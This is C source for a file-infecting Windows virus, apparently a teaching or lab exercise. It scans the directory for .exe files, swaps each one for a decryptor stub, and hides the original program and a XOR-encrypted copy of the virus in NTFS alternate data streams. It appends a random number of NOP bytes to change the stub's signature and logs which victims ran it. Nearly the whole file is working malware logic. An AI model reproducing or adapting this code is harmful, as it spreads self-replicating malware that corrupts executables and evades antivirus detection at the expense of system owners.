/* virus.c
 * Aim: find all uninfected file and infected them by 
 *      1. replace oldprogram with dec.exe
 *      2. insert *.exe:virus.exe and *.exe:oldprogram.exe
 *
 *
 */




#include<time.h>
#include<io.h>
#include<stdio.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>

#define MAXSIZE 2048
void get_exe_file(char path[MAXSIZE]);
//char oldprogram_name[MAXSIZE];
int verbose=1;
char virus_abs_path[MAXSIZE]="c:\\cygwin\\home\\Administrator\\virus\\virus.exe";
char dec_abs_path[MAXSIZE]="c:\\cygwin\\home\\Administrator\\virus\\dec.exe";
char haking_text_path[MAXSIZE]="c:\\cygwin\\home\\Administrator\\virus";


void nop_injection(char key[MAXSIZE]);
char* findfiles(char directory[MAXSIZE]);
void check_infect(char path[MAXSIZE]);
void infect(char file_path[MAXSIZE]);
int main(int argc,char* argv[])
{
	char command[MAXSIZE];
    //sprintf(oldprogram_name,"%s",argv[0]);
   
    //get_exe_file(haking_text_path);
	                      
    //get_exe_file(haking_text_path);
  
    findfiles("./");
	//findfiles("./");
	//payload
	printf("Virus !!!\n");
	system("pause");
	
	if(argc==2){
		sprintf(command,"echo victim clicked %s >> send_email.txt",argv[1],haking_text_path);
		
		system(command);
	}
	else if(argc==1){
		sprintf(command,"echo victim clicked virus.exe >> send_email.txt",haking_text_path);
		system(command);
	}
	
	//start oldprogram
	if(argc==2){
		sprintf(command,"del tmp_dec_virus.exe");
		printf("%s\n",command);
		
		
		sprintf(command,"start ./%s:oldprogram.exe",argv[1]);
		printf("%s\n",command);
		system(command);
		//del temp_dec.exe
		
		system("pause");
	    system(command);
	}

	
    return 0;
}

char * findfiles(char directory[MAXSIZE])
{
  // Find current directory and search for other executables
  //char * target=NULL, *tmp=NULL;
  char target[MAXSIZE], *tmp=NULL;
  char target_oldprogram[MAXSIZE];
  FILE *fp=NULL;
  DIR *p=NULL;
  struct dirent *pp=NULL;
  //printf("Finding files in : %s\n", directory);

  
    struct _finddata_t fileinfo;
   
    long fHandle;
    
    int i = 0;

    if( (fHandle=_findfirst( "*.exe", &fileinfo )) == -1L ) 
    {
        //printf( "no any exe files\n");
        return 0;
    }
    else{
        do{
            i ++;
            //printf( "find exe file:%s\n", fileinfo.name);
			sprintf(target,"%s",fileinfo.name);
			check_infect(target);
        }while( _findnext(fHandle,&fileinfo)==0);
    }
    
    _findclose( fHandle );
  
  
}

void check_infect(char path[MAXSIZE]){
	char virus_exe[MAXSIZE];
	FILE* fp=NULL;
	sprintf(virus_exe,"%s:oldprogram.exe",path);
	
	if (verbose==1) printf("check exist: %s  ",virus_exe);
	
    if(strcmp(path,"virus.exe")==0 ||strcmp(path,"dec.exe")==0 || strcmp(path,"tmp_dec_virus.exe")==0 ){
		if (verbose==1) printf("---> Mother, don't infect\n");
	    
	}else{
		fp = fopen(virus_exe,"rb+");
		if(fp==NULL){
			if (verbose==1) printf("---> not infected\n");
			infect(path);
		}
		else{
			if (verbose==1) printf("---> INFECTED\n");
			
			fclose(fp);	
		}
	
	}
}

void infect(char file_path[MAXSIZE]){
	//char folder_name[MAXSIZE];
	//char temp_dir[MAXSIZE];
	//sprintf(folder_name,"%s",file_path);
	//char * pch1;
	//pch1=strrchr(folder_name,'\\');
	//printf ("Last occurence of '\\' found at %d \n",pch1-folder_name+1);
	//folder_name[pch1-folder_name] = '\0';
	//printf("cur foler name: %s\n",folder_name);
	
	//DIR *dir;
    //struct dirent *dent;
    //dir = opendir(folder_name);
	//if(dir==NULL) return;
	//1.get file_name
	char key[MAXSIZE],oldprogram_name[MAXSIZE],victim_path[MAXSIZE];
	char* pch;
	//sprintf(victim_path,"%s",file_path);
	pch = strtok(file_path,"/\\");
	while(pch != NULL){
    strcpy(key,pch);
    pch = strtok(NULL, "/\\");
    }
	
    
	sprintf(oldprogram_name,"%s:oldprogram.exe",key);
	if (verbose==1) {
		printf("key name           :    %s\n",key);	
		//printf("oldprogram         :  %s\n",file_path);
		printf("injected oldprogram:  %s\n",oldprogram_name);
	}
	
	
	
	//2. xor virus.exe
	if (verbose==1) {
		printf("cp virus.exe to temp_virus.exe\n");
		printf("cp dec.exe to temp_dec.exe\n");
		printf("XORing virus.exe to temp_enc_virus.exe\n");
		
	}

	char command[MAXSIZE];
	//sprintf(command,"echo %s > what.txt",key);
	//system(command);
	

	//decrypt virus.exe
	FILE* pFile_enc_virus=NULL;
	FILE* pFile_dec_virus=NULL;
	int file_size=0;
	pFile_enc_virus = fopen(virus_abs_path,"rb");
	if(!pFile_enc_virus){
		printf("error open file virus.exe\n");
		exit(1);
	}
	
	
	
	//sprintf(temp_dir,"%s\\temp_encypted_virus.exe");
	
	
	pFile_dec_virus = fopen("temp_encypted_virus.exe","wb");
	if(!pFile_dec_virus){
		printf("error open file temp_enc.exe\n");
		exit(1);
	}
	
	fseek(pFile_enc_virus,0,SEEK_END);
	file_size = ftell(pFile_enc_virus);
	fseek(pFile_enc_virus,0,SEEK_SET);
	
	
	unsigned char what;
	for(int i=0;i<file_size;i++){
        what = fgetc(pFile_enc_virus);
		what = what ^ key[i%strlen(key)];
		fwrite(&what,1,sizeof(what),pFile_dec_virus);
    }
	fclose(pFile_dec_virus);
	fclose(pFile_enc_virus);
	
	
	
	
	
	
	
	
	
	//3.  replace oldprogram with dec.exe
	if(verbose==1){
		printf("copy %s to temp_oldprogram.exe\n",key);
	}
	sprintf(command,"copy %s temp_oldprogram.exe > null",key);
	system(command);
	
	sprintf(command,"del %s > null",key);
	system(command);
	
	sprintf(command,"copy %s %s > null",dec_abs_path,key);
	system(command);
	
	//ADD JUNK NOP into dec.exe.
	nop_injection(key);
	
	
	//4.1 : ads dec.exe:virus.exe
	if(verbose==1){
		printf("TYPE temp_encypted_virus.exe > %s:virus.exe\n",key);
	}
	sprintf(command,"TYPE temp_encypted_virus.exe > %s:virus.exe",key);
	//sprintf(command,"TYPE virus.exe > %s:virus.exe",key);
	system(command);
	//4.2 : ads dec.exe:oldprogram.exe
	if(verbose==1){
		printf("TYPE temp_oldprogram.exe > %s:oldprogram.exe\n",key);
	}
	sprintf(command,"TYPE temp_oldprogram.exe > %s:oldprogram.exe",key);
	system(command);
	
	
	//del
	system("del temp_*.exe > null");
	
	//closedir(dir);
	
	printf("------------------------------\n\n\n");
	
	
}

void nop_injection(char file[MAXSIZE]){
	//decrypt virus.exe
	FILE* pFile=NULL;

	int file_size=0;
	
	pFile = fopen(file,"awb");
	if(!pFile){
		printf("error open file temp_enc.exe\n");
		exit(1);
	}
	
	fseek(pFile,0,SEEK_END);

	
	
	int how_many;
	unsigned char c;
	//int seed =  time(&second);
	srand(time(NULL));
    how_many = rand()%100+strlen(file);
	//time = seed/rand;
	c = strtol("10010000",NULL,2);
	for(int i=0;i<how_many;i++){
		fwrite(&c,sizeof(c),1,pFile);
        
    }
	fclose(pFile);
	
	
	
}





void get_exe_file(char path[MAXSIZE]){

	struct _finddata_t fileinfo;
    long fHandle;    
    int i = 0;
    char dir_path[MAXSIZE];
	char next_dir_path[MAXSIZE];

	sprintf(dir_path,"%s\\*",path);
	printf("dir %s\n",dir_path);
    if( (fHandle=_findfirst( dir_path, &fileinfo )) == -1L ) 
    {
        //printf( "no any exe files\n");
     
    }
    else{
        do{
			if((fileinfo.attrib & _A_SUBDIR)){
				if(strcmp(fileinfo.name,".") != 0 && strcmp(fileinfo.name,"..") != 0)
					
				    
					sprintf(next_dir_path,"%s\\%s",path,fileinfo.name);
					if(strcmp(haking_text_path,next_dir_path)<0){
						//printf("find folder %s\n",next_dir_path);
					  

					  get_exe_file(next_dir_path);
					  
					}
					
			}
			else{
					int length=strlen(fileinfo.name);
					if (strncmp(fileinfo.name + length - 4, ".exe", 4) == 0) {
					//("FILE find");
					i ++;
					char file_path[MAXSIZE];
					sprintf(file_path,"%s\\%s",path,fileinfo.name);
					printf( "find exe file:%s \n", file_path);
					check_infect(file_path);
				
				}
			}
        }while( _findnext(fHandle,&fileinfo)==0);
    }
   
    _findclose( fHandle );

}
	
	

